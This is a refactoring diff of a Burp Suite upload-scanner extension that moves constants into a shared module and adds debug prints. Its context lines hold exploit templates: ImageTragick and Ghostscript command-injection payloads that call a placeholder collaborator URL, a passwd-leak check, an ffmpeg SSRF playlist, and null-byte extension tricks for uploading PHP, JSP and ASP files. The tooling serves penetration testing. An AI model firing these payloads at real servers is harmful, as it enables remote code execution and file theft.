@@ -9,11 +9,36 @@ from burp import IExtensionStateListener
 
 # Relative imports (avoid circular import)
 from debuging.debug import DEBUG_MODE
-import fingerpings
+from fingerpings.AviM3uXbin import AviM3uXbin
+from fingerpings.Fingerping import Fingerping
+from fingerpings.FingerpingImages import FingerpingImages
+from helpers import ImageHelpers
 from helpers.FloydsHelpers import FloydsHelpers
+from injectors.FlexiInjector import FlexiInjector
+from injectors.MultipartInjector import MultipartInjector
+from insertionPoints.InsertionPointProviderForActiveScan import InsertionPointProviderForActiveScan
+from misc import CustomScanIssue
+from misc.BackdooredFile import BackdooredFile
+from misc.Constants import Constants
+from misc.CustomHttpService import CustomHttpService
+from misc.CustomRequestResponse import CustomRequestResponse
+from misc.ScanController import ScanController
+from ui.OptionsPanel import OptionsPanel
 from ui.LogEntry import LogEntry
-import ui.OptionsPanel
 from misc.Misc import CloseableTab
+from misc.Misc import ColabTest
+from misc.Misc import CollaboratorMonitorThread
+from misc.Misc import DownloadMatcher
+from misc.Misc import DownloadMatcherCollection
+from misc.Misc import MenuItemAction
+from misc.Misc import Readme
+from misc.Misc import SsiPayloadGenerator
+from misc.Misc import StopScanException
+from misc.Misc import UploadRequestsResponses
+from misc.Misc import Xbm
+from misc.Misc import Xxe
+from misc.Misc import XxeOfficeDoc
+from misc.Misc import XxeXmp
 from misc.Misc import BurpCollaborator
 # Java stdlib imports
 from java.util import ArrayList
@@ -28,7 +53,6 @@ from javax.swing.table import AbstractTableModel
 from java.awt import Desktop
 from java.net import URI
 # python stdlib imports
-import re  # to check if exiftool name only consist of alphanum.- and to detect passwd files in downloads
 import random  # to chose randomly
 import string  # ascii letters to chose random file name from
 import urllib  # URL encode etc.
@@ -92,33 +116,6 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                    AbstractTableModel, ITab, IScannerInsertionPointProvider,
                    IHttpListener, IContextMenuFactory, IExtensionStateListener):
 
-    # Internal constants/read-only:
-    DOWNLOAD_ME = "Dwld"
-    MARKER_URL_CONTENT = "A_FILENAME_PLACEHOLDER_FOR_THE_DESCRIPTION_NeVeR_OcCuRs_iN_ReAl_WoRlD_DaTa"
-    MARKER_ORIG_EXT = 'ORIG_EXT'
-    MARKER_COLLAB_URL = "http://example.org/"
-    MARKER_CACHE_DEFEAT_URL = "https://example.org/cachedefeat/"
-    NEWLINE = "\r\n"
-    REGEX_PASSWD = re.compile("[^:]{3,20}:[^:]{1,100}:\d{0,20}:\d{0,20}:[^:]{0,100}:[^:]{0,100}:[^:]*$")
-    # TODO: If we just add \\ the extension uploads *a lot more* files... worth doing?
-    PROTOCOLS_HTTP = (
-        # 'ftp://',
-        # 'smtp://',
-        # 'mailto://',
-        # The following is \\ for Windows servers...
-        # '\\\\',
-        'http://',
-        'https://',
-    )
-    MAX_SERIALIZED_DOWNLOAD_MATCHERS = 500
-    MAX_RESPONSE_SIZE = 300000  # 300kb
-
-    # ReDownloader constants/read-only:
-    REDL_URL_BAD_HEADERS = ("content-length:", "accept:", "content-type:", "referer:")
-    REDL_FILENAME_MARKER = "${FILENAME}"
-    PYTHON_STR_MARKER_START = "${PYTHONSTR:"
-    PYTHON_STR_MARKER_END = "}"
-
     # Implement IBurpExtender
     def registerExtenderCallbacks(self, callbacks):
         print("Extension loaded")
@@ -129,6 +126,8 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         if DEBUG_MODE:
             sys.stdout = callbacks.getStdout()
             sys.stderr = callbacks.getStderr()
+
+        print("Test: 1")
 
         callbacks.setExtensionName("Upload Scanner")
 
@@ -145,6 +144,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         self._log = ArrayList()
         # The functions of DownloadMatcherCollection are thread safe
         self.dl_matchers = DownloadMatcherCollection(self._helpers)
+        print("Test: 2")
 
         # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
         # Find out if CollaboratorMonitorThread is already running.
@@ -251,7 +251,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         # ImageTragick types
         self.IM_SVG_TYPES = {
             # ('', '', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '', 'image/png'),
             ('', '.svg', 'image/svg+xml'),
             # ('', '.svg', 'text/xml'),
@@ -267,7 +267,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
 
         self.IM_MVG_TYPES = {
             # ('', '', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '', 'image/png'),
             ('', '.mvg', ''),
             ('', '.mvg', 'image/svg+xml'),
@@ -280,19 +280,19 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         # Xbm black/white pictures
         self.XBM_TYPES = {
             # ('', '', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '.xbm', ''),
             ('', '.xbm', 'image/x-xbm'),
             ('', '.xbm', 'image/png'),
-            ('xbm:', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('xbm:', Constants.MARKER_ORIG_EXT, ''),
         }
 
         # Ghostscript types
         self.GS_TYPES = {
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '.gs', ''),
             ('', '.eps', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'text/plain'),
+            ('', Constants.MARKER_ORIG_EXT, 'text/plain'),
             ('', '.jpeg', 'image/jpeg'),
             ('', '.png', 'image/png'),
         }
@@ -300,9 +300,9 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         # LibAvFormat types
         self.AV_TYPES = {
             # ('', '', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'audio/mpegurl'),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'video/x-msvideo'),
+            ('', Constants.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, 'audio/mpegurl'),
+            ('', Constants.MARKER_ORIG_EXT, 'video/x-msvideo'),
             # ('', '.m3u8', 'application/vnd.apple.mpegurl'),
             ('', '.m3u8', 'application/mpegurl'),
             # ('', '.m3u8', 'application/x-mpegurl'),
@@ -314,7 +314,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
 
         self.EICAR_TYPES = {
             # ('', '', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '.exe', ''),
             ('', '.exe', 'application/x-msdownload'),
             # ('', '.exe', 'application/octet-stream'),
@@ -323,8 +323,8 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             # ('', '.exe', 'application/dos-exe'),
             # ('', '.exe', 'application/msdos-windows'),
             # ('', '.exe', 'application/x-msdos-program'),
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'application/x-msdownload'),
+            ('', Constants.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, 'application/x-msdownload'),
             # ('', self._magick_original_extension, 'application/octet-stream'),
             # ('', self._magick_original_extension, 'application/exe'),
             # ('', self._magick_original_extension, 'application/x-exe'),
@@ -334,8 +334,8 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         }
 
         self.PL_TYPES = {
-            #('', BurpExtender.MARKER_ORIG_EXT, ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'text/x-perl-script'),
+            #('', Constants.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, 'text/x-perl-script'),
             ('', '.pl', ''),
             ('', '.pl', 'text/x-perl-script'),
             ('', '.cgi', ''),
@@ -343,16 +343,16 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         }
 
         self.PY_TYPES = {
-            #('', BurpExtender.MARKER_ORIG_EXT, ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'text/x-python-script'),
+            #('', Constants.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, 'text/x-python-script'),
             ('', '.py', ''),
             ('', '.py', 'text/x-python-script'),
             ('', '.cgi', '')
         }
 
         self.RB_TYPES = {
-            #('', BurpExtender.MARKER_ORIG_EXT, ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'text/x-ruby-script'),
+            #('', Constants.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, 'text/x-ruby-script'),
             ('', '.rb', ''),
             ('', '.rb', 'text/x-ruby-script'),
         }
@@ -360,44 +360,44 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         # .htaccess types
         self.HTACCESS_TYPES = {
             ('', '', ''),
-            ('', '%00' + BurpExtender.MARKER_ORIG_EXT, ''),
-            ('', '\x00' + BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', '%00' + Constants.MARKER_ORIG_EXT, ''),
+            ('', '\x00' + Constants.MARKER_ORIG_EXT, ''),
             ('', '', 'text/plain'),
-            ('', '%00' + BurpExtender.MARKER_ORIG_EXT, 'text/plain'),
-            ('', '\x00' + BurpExtender.MARKER_ORIG_EXT, 'text/plain'),
+            ('', '%00' + Constants.MARKER_ORIG_EXT, 'text/plain'),
+            ('', '\x00' + Constants.MARKER_ORIG_EXT, 'text/plain'),
         }
 
         self.PDF_TYPES = {
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'application/pdf'),
+            ('', Constants.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, 'application/pdf'),
             ('', '.pdf', ''),
             ('', '.pdf', 'application/pdf'),
         }
 
         self.URL_TYPES = {
-            #('', BurpExtender.MARKER_ORIG_EXT, ''),
-            #('', BurpExtender.MARKER_ORIG_EXT, 'application/octet-stream'),
+            #('', Constants.MARKER_ORIG_EXT, ''),
+            #('', Constants.MARKER_ORIG_EXT, 'application/octet-stream'),
             ('', '.URL', ''),
             #('', '.URL', 'application/octet-stream'),
         }
 
         self.INI_TYPES = {
-            #('', BurpExtender.MARKER_ORIG_EXT, ''),
-            #('', BurpExtender.MARKER_ORIG_EXT, 'application/octet-stream'),
+            #('', Constants.MARKER_ORIG_EXT, ''),
+            #('', Constants.MARKER_ORIG_EXT, 'application/octet-stream'),
             ('', '.ini', ''),
             #('', '.URL', 'application/octet-stream'),
         }
 
         self.ZIP_TYPES = {
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'application/zip'),
+            ('', Constants.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, 'application/zip'),
             ('', '.zip', ''),
             ('', '.zip', 'application/zip'),
         }
 
         self.CSV_TYPES = {
             # ('', '', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '.csv', ''),
             ('', '.csv', 'text/csv'),
             # ('', self._marker_orig_ext, ''),
@@ -406,15 +406,15 @@ class BurpExtender(IBurpExtender, IScannerCheck,
 
         self.EXCEL_TYPES = {
             # ('', '', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '.xls', ''),
             ('', '.xls', 'application/vnd.ms-excel'),
-            # ('', BurpExtender.MARKER_ORIG_EXT, ''),
-            # ('', BurpExtender.MARKER_ORIG_EXT, 'text/application/vnd.ms-excel'),
+            # ('', Constants.MARKER_ORIG_EXT, ''),
+            # ('', Constants.MARKER_ORIG_EXT, 'text/application/vnd.ms-excel'),
         }
 
         self.IQY_TYPES = {
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '.iqy', ''),
             ('', '.iqy', 'application/vnd.ms-excel'),
         }
@@ -428,52 +428,52 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             #('', '.stm', 'text/html'),
             #('', '.shtm', 'text/html'),
             #('', '.html', 'text/html'),
-            #('', BurpExtender.MARKER_ORIG_EXT, 'text/html'),
+            #('', Constants.MARKER_ORIG_EXT, 'text/html'),
             ('', '.shtml', ''),
             ('', '.stm', ''),
             ('', '.shtm', ''),
             ('', '.html', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
         }
 
         self.ESI_TYPES = {
             ('', '.txt', 'text/plain'),
             #('', '.txt', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
         }
 
         self.SVG_TYPES = {
-            ('', BurpExtender.MARKER_ORIG_EXT, ''), # Server doesn't check file contents
+            ('', Constants.MARKER_ORIG_EXT, ''), # Server doesn't check file contents
             ('', '.svg', 'image/svg+xml'), # Server enforces matching of file ext and content type
             ('', '.svg', ''), # Server doesn't check file ext
-            ('', BurpExtender.MARKER_ORIG_EXT, 'image/svg+xml'), # Server doesn't check content-type
+            ('', Constants.MARKER_ORIG_EXT, 'image/svg+xml'), # Server doesn't check content-type
         }
 
         self.XML_TYPES = {
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '.xml', 'application/xml'),
             ('', '.xml', 'text/xml'),
             #('', '.xml', 'text/plain'),
             ('', '.xml', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'text/xml'),
+            ('', Constants.MARKER_ORIG_EXT, 'text/xml'),
         }
 
         self.SWF_TYPES = {
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '.swf', 'application/x-shockwave-flash'),
             ('', '.swf', ''),
-            ('', BurpExtender.MARKER_ORIG_EXT, 'application/x-shockwave-flash'),
+            ('', Constants.MARKER_ORIG_EXT, 'application/x-shockwave-flash'),
         }
 
         self.HTML_TYPES = {
-            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', Constants.MARKER_ORIG_EXT, ''),
             ('', '.htm', ''),
             ('', '.html', ''),
             ('', '.htm', 'text/html'),
             #('', '.html', 'text/html'),
             ('', '.html', 'text/plain'),
             ('', '.xhtml', ''),
-            #('', BurpExtender.MARKER_ORIG_EXT, 'text/html'),
+            #('', Constants.MARKER_ORIG_EXT, 'text/html'),
         }
 
         print("Creating UI...")
@@ -522,7 +522,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         self._splitpane.setRightComponent(tabs)
 
         # OPTIONS
-        self._global_opts = ui.OptionsPanel.OptionsPanel(self, self._callbacks, self._helpers, global_options=True)
+        self._global_opts = OptionsPanel(self, self._callbacks, self._helpers, global_options=True)
 
         # README
         self._aboutJLabel = JLabel(Readme.get_readme(), SwingConstants.CENTER)
@@ -592,7 +592,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                         sc = ScanController(CustomRequestResponse('', '', CustomHttpService('https://example.org'), '', ''), self._callbacks)
                         # left part, options
                         # add a reference to the ScanController to the options
-                        options = ui.OptionsPanel.OptionsPanel(self, self._callbacks, self._helpers, scan_controler=sc)
+                        options = OptionsPanel(self, self._callbacks, self._helpers, scan_controler=sc)
                         # Take all settings from the serialized object (also recursively changes ScanController)
                         options.deserialize(option_panel)
                         self.create_tab(options, sc)
@@ -668,7 +668,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 sc = ScanController(brr, self._callbacks)
                 # left part, options
                 # add a reference to the ScanController to the options
-                options = ui.OptionsPanel.OptionsPanel(self, self._callbacks, self._helpers, scan_controler=sc)
+                options = OptionsPanel(self, self._callbacks, self._helpers, scan_controler=sc)
                 # Take all settings from global options:
                 options.deserialize(self._global_opts.serialize(), global_to_tab=True)
                 self.create_tab(options, sc)
@@ -838,7 +838,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 if not resp:
                     print("processHttpMessage called with BaseRequestResponse with no response. Ignoring.")
                     return
-                if len(resp) >= BurpExtender.MAX_RESPONSE_SIZE:
+                if len(resp) >= Constants.MAX_RESPONSE_SIZE:
                     # Don't look at responses longer than MAX_RESPONSE_SIZE
                     return
                 req = base_request_response.getRequest()
@@ -872,18 +872,18 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 for matcher in list(matchers)[::-1]:
                     if matcher.matches(url, headers, body):
                         issue_copy = matcher.issue.create_copy()
-                        if BurpExtender.MARKER_URL_CONTENT in issue_copy.detail:
+                        if Constants.MARKER_URL_CONTENT in issue_copy.detail:
                             if matcher.url_content:
-                                issue_copy.detail = issue_copy.detail.replace(BurpExtender.MARKER_URL_CONTENT,
+                                issue_copy.detail = issue_copy.detail.replace(Constants.MARKER_URL_CONTENT,
                                                                           matcher.url_content)
                             elif matcher.filename_content_disposition:
-                                issue_copy.detail = issue_copy.detail.replace(BurpExtender.MARKER_URL_CONTENT,
+                                issue_copy.detail = issue_copy.detail.replace(Constants.MARKER_URL_CONTENT,
                                                                               matcher.filename_content_disposition)
                             elif matcher.filecontent:
-                                issue_copy.detail = issue_copy.detail.replace(BurpExtender.MARKER_URL_CONTENT,
+                                issue_copy.detail = issue_copy.detail.replace(Constants.MARKER_URL_CONTENT,
                                                                               matcher.filecontent)
                             else:
-                                issue_copy.detail = issue_copy.detail.replace(BurpExtender.MARKER_URL_CONTENT,
+                                issue_copy.detail = issue_copy.detail.replace(Constants.MARKER_URL_CONTENT,
                                                                               "UNKNOWN")
                         if matcher.check_xss:
                             content_disposition = False
@@ -959,7 +959,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                     print("Multipart filename found!")
                     if not options:
                         options = self._global_opts
-                    injector = MultipartInjector(base_request_response, options, insertionPoint, self._helpers, BurpExtender.NEWLINE)
+                    injector = MultipartInjector(base_request_response, options, insertionPoint, self._helpers, Constants.NEWLINE)
                     self.do_checks(injector)
                 else:
                     print("This is not a type file but something else in a multipart message:", insertionPoint.getInsertionPointName())
@@ -991,7 +991,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             else:
                 return []
         except:
-            self.show_error_popup(traceback.format_exc(), "BurpExtender.getInsertionPoints", base_request_response)
+            self.show_error_popup(traceback.format_exc(), "Constants.getInsertionPoints", base_request_response)
             raise sys.exc_info()[1], None, sys.exc_info()[2]
 
     def run_flexiinjector(self, base_request_response, options=None):
@@ -1000,7 +1000,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             options = self._global_opts
         try:
             if options.fi_ofilename:
-                fi = FlexiInjector(base_request_response, options, self._helpers, BurpExtender.NEWLINE)
+                fi = FlexiInjector(base_request_response, options, self._helpers, Constants.NEWLINE)
                 # We test only those requests where we find at least the content in the request as some implementations
                 # might not send the filename to the server
                 if fi.get_uploaded_content():
@@ -1218,7 +1218,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             content_mvg = "push graphic-context\n" \
                           "viewbox 0 0 {} {}\n" \
                           "fill 'url({})'\n" \
-                          "pop graphic-context".format(injector.opts.image_width, injector.opts.image_height, BurpExtender.MARKER_COLLAB_URL)
+                          "pop graphic-context".format(injector.opts.image_width, injector.opts.image_height, Constants.MARKER_COLLAB_URL)
 
             name = "Imagetragick CVE-2016-3718"
             severity = "Medium"
@@ -1241,11 +1241,11 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
               '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg width="{}px" height="{}px" ' \
               'version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' \
-              '<image xlink:href="' + BurpExtender.MARKER_CACHE_DEFEAT_URL + 'image.jpg`{} {}{}`" x="0" ' \
+              '<image xlink:href="' + Constants.MARKER_CACHE_DEFEAT_URL + 'image.jpg`{} {}{}`" x="0" ' \
               'y="0" height="{}px" width="{}px"/></svg>'
         mvg = "push graphic-context\n" \
               "viewbox 0 0 {} {}\n" \
-              "fill 'url(" + BurpExtender.MARKER_CACHE_DEFEAT_URL + "\";{} {}\"{})'\n" \
+              "fill 'url(" + Constants.MARKER_CACHE_DEFEAT_URL + "\";{} {}\"{})'\n" \
               "pop graphic-context"
         filename = self.FILE_START + "ImDelay"
 
@@ -1266,7 +1266,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             # this module can only find leaks in images when the files are downloaded again
             return
         # CVE-2018-16323, see https://github.com/ttffdd/XBadManners
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BadManners"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "BadManners"
         content = Xbm("".join(random.sample(string.ascii_letters, 5))).create_xbm(injector.opts.image_width,
                                    injector.opts.image_height)
         urrs = self._send_simple(injector, self.XBM_TYPES, basename, content, redownload=True)
@@ -1360,11 +1360,11 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
               '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg width="{}px" height="{}px" ' \
               'version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' \
-              '<image xlink:href="' + BurpExtender.MARKER_CACHE_DEFEAT_URL + 'image.jpg`{} {}`" x="0" ' \
+              '<image xlink:href="' + Constants.MARKER_CACHE_DEFEAT_URL + 'image.jpg`{} {}`" x="0" ' \
               'y="0" height="{}px" width="{}px"/></svg>'
         mvg = "push graphic-context\n" \
               "viewbox 0 0 {} {}\n" \
-              "fill 'url(" + BurpExtender.MARKER_CACHE_DEFEAT_URL + "\";{} \"{})'\n" \
+              "fill 'url(" + Constants.MARKER_CACHE_DEFEAT_URL + "\";{} \"{})'\n" \
               "pop graphic-context"
 
         basename = self.FILE_START + "Im3714"
@@ -1390,7 +1390,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         # burp collaborator based passing a filename starting with
         # pipe | makes Image-/GraphicsMagick execute to the -write command
         # As described on https://hackerone.com/reports/212696
-        types = [('', BurpExtender.MARKER_ORIG_EXT, '')]
+        types = [('', Constants.MARKER_ORIG_EXT, '')]
         content = injector.get_uploaded_content()
         name = "Image-/GraphicsMagick filename RCE"
         severity = "High"
@@ -1443,7 +1443,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
     def _ghostscript(self, injector, burp_colab):
 
         # CVE-2016-7977
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "GsLibPasswd"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "GsLibPasswd"
         content = """%!PS
 /Size 20 def                             % font/line size
 /Line 0 def                              % current line
@@ -1475,7 +1475,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 resp = urr.download_rr.getResponse()
                 if resp:
                     resp =  FloydsHelpers.jb2ps(resp)
-                    if BurpExtender.REGEX_PASSWD.match(resp):
+                    if Constants.REGEX_PASSWD.match(resp):
                         name = "Ghostscript Local File Include"
                         severity = "High"
                         confidence = "Firm"
@@ -1503,7 +1503,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         detail_colab = "A burp collaborator interaction was dectected when uploading a ghostscript file with a payload that " \
                        "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. " \
                        "The payload used the {} argument ({}) and the payload {}. Interactions: <br><br>"
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Gs"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "Gs"
 
         content_original_cve = "%!PS\n" \
                                "currentdevice null true mark /{} (%pipe%{} {} )\n" \
@@ -1598,7 +1598,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
 
         # burp collaborator based as described on https://hackerone.com/reports/115857
         basename = self.FILE_START + "AvColab"
-        content_m3u8 = "#EXTM3U\r\n#EXT-X-MEDIA-SEQUENCE:0\r\n#EXTINF:10.0,\r\n{}example.mp4\r\n##prevent cache: {}\r\n#EXT-X-ENDLIST".format(BurpExtender.MARKER_COLLAB_URL, str(random.random()))
+        content_m3u8 = "#EXTM3U\r\n#EXT-X-MEDIA-SEQUENCE:0\r\n#EXTINF:10.0,\r\n{}example.mp4\r\n##prevent cache: {}\r\n#EXT-X-ENDLIST".format(Constants.MARKER_COLLAB_URL, str(random.random()))
 
         name = "LibAvFormat SSRF"
         severity = "High"
@@ -1615,7 +1615,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         # avi file with m3u as described on https://hackerone.com/reports/226756
         # https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.g2239eb85ba_0_20
         # and https://github.com/neex/ffmpeg-avi-m3u-xbin
-        avi_generator = fingerpings.AviM3uXbin.AviM3uXbin()
+        avi_generator = AviM3uXbin()
 
         name = "LibAvFormat SSRF"
         severity = "High"
@@ -1648,8 +1648,8 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         if mime:
             # This means we're hiding php code in metadata of a file type
             types = {
-                ('', BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.php' + BurpExtender.MARKER_ORIG_EXT, ''),
+                ('', Constants.MARKER_ORIG_EXT, ''),
+                ('', '.php' + Constants.MARKER_ORIG_EXT, ''),
                 # ('', '.php'+self._marker_orig_ext, mime),
                 # ('', '.php.'+extension, ''),
                 ('', '.php' + extension, mime),
@@ -1666,11 +1666,11 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             # This means it is plain php files we're uploading
             mime = 'application/x-php'
             types = {
-                ('', BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.php' + BurpExtender.MARKER_ORIG_EXT, ''),
+                ('', Constants.MARKER_ORIG_EXT, ''),
+                ('', '.php' + Constants.MARKER_ORIG_EXT, ''),
                 # ('', '.php'+self._marker_orig_ext, mime),
-                ('', '.php\x00' + BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.php%00' + BurpExtender.MARKER_ORIG_EXT, ''),
+                ('', '.php\x00' + Constants.MARKER_ORIG_EXT, ''),
+                ('', '.php%00' + Constants.MARKER_ORIG_EXT, ''),
                 # ('', '.php\x00'+self._marker_orig_ext, mime),
                 # ('', '.php%00'+self._marker_orig_ext, mime),
                 # ('', '.php5'+extension, mime),
@@ -1723,8 +1723,8 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         lang = "JSP"
         if mime:
             types = {
-                ('', BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.jsp' + BurpExtender.MARKER_ORIG_EXT, ''),
+                ('', Constants.MARKER_ORIG_EXT, ''),
+                ('', '.jsp' + Constants.MARKER_ORIG_EXT, ''),
                 # ('', '.jsp' + self._marker_orig_ext, mime),
                 # ('', '.jsp' + extension, ''),
                 ('', '.jsp' + extension, mime),
@@ -1736,10 +1736,10 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         else:
             mime = "application/x-jsp"
             types = {
-                ('', BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.jsp' + BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.jsp\x00' + BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.jsp%00' + BurpExtender.MARKER_ORIG_EXT, ''),
+                ('', Constants.MARKER_ORIG_EXT, ''),
+                ('', '.jsp' + Constants.MARKER_ORIG_EXT, ''),
+                ('', '.jsp\x00' + Constants.MARKER_ORIG_EXT, ''),
+                ('', '.jsp%00' + Constants.MARKER_ORIG_EXT, ''),
                 # ('', '.jsp\x00' + self._marker_orig_ext, mime),
                 # ('', '.jsp%00' + self._marker_orig_ext, mime),
                 ('', '.jsp', ''),
@@ -1751,8 +1751,8 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         lang = "JSPX"
         if mime:
             types = {
-                ('', BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.jspx' + BurpExtender.MARKER_ORIG_EXT, ''),
+                ('', Constants.MARKER_ORIG_EXT, ''),
+                ('', '.jspx' + Constants.MARKER_ORIG_EXT, ''),
                 # ('', '.jspx' + self._marker_orig_ext, mime),
                 # ('', '.jspx.'+ extension, ''),
                 ('', '.jspx' + extension, mime),
@@ -1764,10 +1764,10 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         else:
             mime = "application/x-jsp"
             types = {
-                ('', BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.jspx' + BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.jspx\x00' + BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.jspx%00' + BurpExtender.MARKER_ORIG_EXT, ''),
+                ('', Constants.MARKER_ORIG_EXT, ''),
+                ('', '.jspx' + Constants.MARKER_ORIG_EXT, ''),
+                ('', '.jspx\x00' + Constants.MARKER_ORIG_EXT, ''),
+                ('', '.jspx%00' + Constants.MARKER_ORIG_EXT, ''),
                 # ('', '.jspx\x00' + self._marker_orig_ext, mime),
                 # ('', '.jspx%00' + self._marker_orig_ext, mime),
                 ('', '.jspx', ''),
@@ -1871,8 +1871,8 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             # According to https://community.rapid7.com/community/metasploit/blog/2009/12/28/exploiting-microsoft-iis-with-metasploit
             # the file extension .asp;.png should work fine... see also https://soroush.secproject.com/downloadable/iis-semicolon-report.pdf
             types = {
-                ('', BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.asp;' + BurpExtender.MARKER_ORIG_EXT, ''),
+                ('', Constants.MARKER_ORIG_EXT, ''),
+                ('', '.asp;' + Constants.MARKER_ORIG_EXT, ''),
                 # ('', '.asp' + self._marker_orig_ext, mime),
                 # ('', '.asp.' + extension, ''),
                 ('', '.asp;' + extension, mime),
